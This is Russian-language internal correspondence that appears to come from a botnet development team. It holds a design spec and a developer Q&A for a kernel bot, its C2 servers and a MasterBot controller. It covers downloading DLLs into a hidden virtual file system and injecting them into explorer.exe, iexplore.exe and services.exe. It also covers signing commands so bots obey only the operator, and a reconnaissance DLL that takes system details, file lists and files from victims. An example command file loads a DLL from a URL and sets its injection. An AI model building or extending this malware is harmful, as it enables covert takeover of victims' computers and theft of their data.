1) формат конфига. Бот ведь у нас трансформируется в сервер по команде. Значит
общение сеовера с ботом происходит в формате, который вы сами задаете. Для отладки
нам хорошо иметь возможность как то смотреть содержимое конфига, но лучше
оптимизируйте его по безопасности и для своего удобства. 

2) остальные вопросы на свое усмотрение. Все, что хотел отразили в ТЗ.
Давай сначала по нему сделаем базу а потом будем накручивать. Сейчас уйдем в
обсуждению юзерагентов какие надо поставить а бота, сервера, мастербота еще нет. GET
или POST пусть решает прогер. 

Бот: умеет получать от сервера файлы на запись в vfs и запуск, умеет удалять файлы
из vfs, умеет возвращать содержимое vfs (сообщить серверу какие dll успешно
подгружены), имеет уникальный айди, который может передать в dll ( например
посредством файла 1726353.bid (bot id) который лежит в  vfs), умеет по списку
серверов через заданные интервалы получить инструкции, умеет инициировать инжект 
dll (находящихся в vfs) в процессы. 

Сервер: получает от бота информацию, записывает в БД, получает от МастерБота
инструкции для ботов (фактически для каждого бота своя инструкция, тк БД обновляется
и в обновленной БД у определенного бота какой то файл может быть удален, а какой то
добавлен), возвращает МастерБоту дамп БД для анализа и свой sid (server id). Кстати,
БД можно хранить и на vfs (работать с ней) и просто передавать ее МастерБоту и,
получив от МастерБота новую перезаписать поверх старой. Надо только для БД
версионность предусмотреть. 

МастерБот связывается с сервером, получает текущую БД, передает инструкции
(фактически обновляет БД) для ботов, передает dll, которая есть в БД.

МастерБот, получив БД от сервера выкладывает в свою локальную папку. C:\brownie_db\
Для мастербота предусмотреть запуск с параметрами : айпи сервера, путь к БД, которую
надо залить на целевой ip. Запускаем мастербот, с параметрами, он стучит по айпи,
получет БД с сервера, передает свою, отключается. 

Мы говорили, что общение сервера и бота зашифровано. При создании бота и сервера и
мастербота надо их подписать сертификатом. Чтобы бот не слушался чужого сервера, а
сервер не получил команды от чужого мастербота. Как этот момент защитить?

В БД содержится: айди бота, содержимое vfs, дата последнего отстука. 
Полагаю для каждого сервера определить максимальное число обслуживаемых ботов,
например Nк, если на сервер стукнет бот которого нет в списке этих Nк, то сервер
отобьет соединение. Зачем? 1) мы управляем нагрузкой, 2) передавать мастерботу БД
где ограниченное число записей всегда быстрей. 3) МастерБот будет сам удалять из БД
старые боты. 

Если есть свободный прогер, то можем сделать небольшую dll для сбора инфо о целевой
системе. Дабы не вшивать это в лоадер. Что будет уметь:

- при создании зашиваем в него список урлов для остука
- отстукивает при запуске и каждые N часов (задается в конфигураторе)
- возвращает Список установленного в системе ПО
- возвращает конфигурацию ПК
- возвращает имя пользователя
- возвращает язык системы
- возвращает часовой пояс
- обращается на url, запрашивает путь к файлу, который необходимо вернуть. 
- обращается на url, запрашивает маску, возвращает список файлов, соответсвующих
маске.



>недостаточно документации для использования

>в данный момент не понятно ( bk):
>1. как прикрепить к инсталеру и запустить произвольную длл ? в документации
>  kldr32.cfg  - конфигурационный файл для прикрепления DLL к 32х-битному
>драйверу.
>  kldr64.cfg  - конфигурационный файл для прикрепления DLL к 64х-битному
>драйверу.
>  demo32.dll  - 32х-битная демо-библиотека.
>  demo64.dll  - 64х-битная демо-библиотека.

>в проекте данные файлы отсутствуют, упоминаются только в readme.txt.
>возможно что-то было не добавлено в отданную версию
Это устаревшая информация. Проект с использованием кернельного-бота подразумевает, что
 любая DLL будет загружена ботом из сети. Поэтом конфиг-файлы для сборки инсталлера не
 содержат информации для прикрепления DLL к драйверу.
Сообщите, если такой функционал нужен, - сделаем соответствующие конфиги. 

>2. совсем не описана процедура раздачи конфига, при сборке задается
>kbot.ini, как его обновить в дальнейшем ?
 Конфиг файл для конкретного бота (или группы ботов) задается командой SET_CONFIG через MB.
 Бот запрашивает конфиг по таймеру (параметр ConfigPeriod в KBOT.INI). 
 Это такой же INI файл, он сохраняется ботом на VFS и используется в дальнейшем.
 Пример KBOT.INI в папке \BkBuild.

>в доке написано чем шифруется, и как формируется подпись, но каков формат
>передачи данных и как прикреплять подпись ?
 Подписать файл можно утилитой CT (BSRV\CT), либо, если секретный ключ прикреплен к MB32(64).EXE то
 файл подписывается автоматически, при загрузке его на сервер (команды SET_TASK и SET_CONFIG).

>то же самое с командами, не понятно как формировать текстовый файл и
>подписывать его,
 Текстовый файл формируется любым текстовым редактором. Кодировка - ANSI. Подписывается утилитой CT:
	CT -s <секретный ключ> <исходный файл> <конечный файл>
 либо, если секретный ключ прикреплен к MB32(64).EXE то
 файл подписывается автоматически, при загрузке его на сервер (команды SET_TASK и SET_CONFIG).

>возможно ли загрузка нескольких файлов одновременно ? если да, каков
>формат команды ?
 нет, SET_TASK и SET_CONFIG загружают по одному файлу для бота или группы ботов.
 В файле команд может быть несколько команд, каждая должна начинаться с новой строки.

>возможно не предполагается эксплуатация без мастербота, но об этом еще
>ниже напишу.

>3.KBOT:  функция SET_INJECT <имя файла на VFS> <список процессов>
>не понятно что инжектит, dll, exe ? <список процессов> разделен запятыми ?

пример файла команд:
LOAD_FILE http://mydomain.com/myfile.dll my.dll	; загружает http://mydomain.com/myfile.dll и сохраняет 
						;  под именем my.dll	
SET_INJECT my.dll explorer.exe iexplore.exe	; задает инжект для MY.DLL в процессы explorer.exe и iexplore.exe


>сервер (SRV)

>1. не описан формат хранения данных сервера.
>документация:
>BASE <путь к файлу> - скачивает с сервера текущую базу данных клиентов и
>сохраяет её в указанный файл.
>пока не ясно что сохраняется в этой базе
 ID пользователя, время создания записи, время последнего отстука, IP и User-Agent создания записи, 
 IP и User-Agent последнего отстука, ID группы, текущий конфиг файл (имя, CRC32, дата установки), 
 текущий файл команд (имя, CRC32, дата установки).
Сейчас база хранится во внутреннем формате сервера. Утилиту для конвертирования дадим с первым же апдейтом.
 
>2.SET_CONFIG(SET_TASK) <ID> <имя файла на сервере> [лимит]
>MB.exe подпишет все сама  или руками надо будет каждый раз присоединять
>сертификаты ? к сожалению пока не смог собрать и посмотреть данную
>утилиту.

Подпишет сама если к утилите был прикреплен секретный ключ. Это делается путем запуска bat-ника 
 bkbuild\bkbuild.bat.

>очень не хватает примеров по командам. в случае если есть 1 машина то
>вроде все понятно, если их 10, необходимо к каждой присоединиться и дать
>команду через консоль ?
Да. Если есть несколько серверов, то нужно прицепится к каждому по-очереди.
Как сделать лучше?

>3. в п.2 для BK упоминал об работе без мастер бота.
>насколько я понимаю, после загрузки бота прогружается server.dll и как то
>запускается, в ней содержится конфиг для начальной работы, далее эта
>машина становится одновременно и клиентом, и сервером.
>клиентская часть позволяет обновить серверную, и обновить конфиг
>серверной. а серверная в свою очередь обеспечивает доступ к себе другим
>серверам.
 Всё верно. Можно задать инжект server.dll в какой-нибудь системный процесс, например в services.exe.

>в случае передачи данных на нижестоящий MB они же сохраняться в не
>подписанном виде, просто как файлы vfs ( конфиг или чтото иное )
>как вообще предполагается использовать  ? установка на "свои" сервера ? 
Тут хотелось бы подробнее. Не понял вопрос.

>на сколько понимаю у него должен быть полный комплект сертификатов для
>того чтобы раздавать конфиги и файлы,
>закачка на "чужую" машину будет безопасна ?"
Предполагается, что файл либо подписывается на локальном компьютере оператора, либо,
 загружается на сервер утилитой MB.EXE, которая содержит секретный ключ, опять же, с 
 локального компьютера оператора.
 При такой схеме секетный ключ есть только на компьютере оператора.